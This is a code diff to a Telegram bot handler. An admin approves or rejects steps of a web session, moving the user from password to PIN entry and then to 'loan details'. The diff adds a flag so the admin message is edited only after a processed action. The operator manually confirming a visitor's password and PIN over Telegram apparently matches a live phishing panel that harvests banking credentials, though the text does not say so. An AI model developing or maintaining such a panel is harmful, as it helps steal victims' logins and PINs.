@@ -64,17 +64,20 @@ bot.on("callback_query", async (query) => {
         }
 
         let statusText = "";
+        let actionProcessed = false;
 
         if (action === "approve") {
             if (step === "1") {
                 io.to(appId).emit('password-verified');
                 await bot.answerCallbackQuery(query.id, { text: "PIN input shown to user" });
                 statusText = "\n\n✅ <b>ACTION: APPROVED (MOVED TO PIN)</b>";
+                actionProcessed = true;
             } 
             else if (step === "2") {
                 io.to(appId).emit('pin-verified');
                 await bot.answerCallbackQuery(query.id, { text: "PIN confirmed. User moving to Loan details." });
                 statusText = "\n\n✅ <b>ACTION: PIN APPROVED (MOVED TO LOAN)</b>";
+                actionProcessed = true;
             }
         }
 
@@ -82,18 +85,21 @@ bot.on("callback_query", async (query) => {
             io.to(appId).emit('error', { message: "Application declined by admin." });
             await bot.answerCallbackQuery(query.id, { text: "Application Rejected" });
             statusText = "\n\n❌ <b>ACTION: REJECTED</b>";
+            actionProcessed = true;
         }
 
-        // Safely edit message layout without risking parsing crashes
-        if (query.message && query.message.text) {
+        // Only edit the message layout if an approval or rejection step was processed
+        if (actionProcessed && query.message && query.message.text) {
+            const chatId = query.message.chat.id;
+            
             await bot.editMessageText(query.message.text + statusText, {
-                chat_id: ADMIN_ID,
+                chat_id: chatId,
                 message_id: query.message.message_id,
                 parse_mode: 'HTML'
             }).catch(() => {
-                // Fallback text if HTML formatting breaks
+                // Fallback option using clean text if HTML entities break parsing rules
                 bot.editMessageText(query.message.text + statusText.replace(/<[^>]*>/g, ''), {
-                    chat_id: ADMIN_ID,
+                    chat_id: chatId,
                     message_id: query.message.message_id
                 });
             });
